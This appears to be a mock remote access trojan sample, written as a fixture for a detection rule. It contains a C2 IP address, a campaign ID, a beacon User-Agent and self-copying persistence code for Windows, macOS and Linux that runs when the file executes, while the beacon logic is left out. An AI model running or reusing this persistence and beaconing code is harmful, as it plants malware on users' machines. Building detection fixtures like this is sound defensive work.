// Mock easy-day-js RAT persistence payload — tests EasyDayJS_RAT_Persistence
// Contains persistence names, beacon User-Agent, campaign ID, runner names

const os = require('os');
const path = require('path');
const fs = require('fs');
const https = require('https');

const CAMPAIGN = "/49890878";
const C2_HOST = "23.254.164.123";
const UA = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)";

function install_persistence() {
    const platform = os.platform();
    if (platform === 'win32') {
        const dropDir = "C:\\ProgramData\\NodePackages";
        fs.mkdirSync(dropDir, { recursive: true });
        const payloadDst = path.join(dropDir, "protocal.cjs");
        fs.copyFileSync(__filename, payloadDst);
        // Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NvmProtocal
    } else if (platform === 'darwin') {
        const dropDir = path.join(os.homedir(), "Library/NodePackages");
        fs.mkdirSync(dropDir, { recursive: true });
        const payloadDst = path.join(dropDir, "protocal.cjs");
        fs.copyFileSync(__filename, payloadDst);
        // LaunchAgent: com.nvm.protocal.plist
        const plistPath = path.join(os.homedir(), "Library/LaunchAgents/com.nvm.protocal.plist");
    } else {
        const dropDir = path.join(os.homedir(), ".config/systemd/nvmconf");
        fs.mkdirSync(dropDir, { recursive: true });
        const payloadDst = path.join(dropDir, "protocal.cjs");
        fs.copyFileSync(__filename, payloadDst);
        // Unit: nvmconf.service
    }
}

// wolfSSL test cert CN used for C2 TLS: www.wolfssl.com

// Runner types for arbitrary module execution
const RUNNERS = { NSpawn: 'detached_node', SSpawn: 'detached_shell', Node: 'captured_node', Shell: 'captured_shell' };

function beacon() {
    const options = {
        hostname: C2_HOST,
        port: 443,
        path: CAMPAIGN,
        method: 'POST',
        headers: { 'User-Agent': UA },
        rejectUnauthorized: false
    };
    // ... beacon logic ...
}

install_persistence();
setInterval(beacon, 600000);
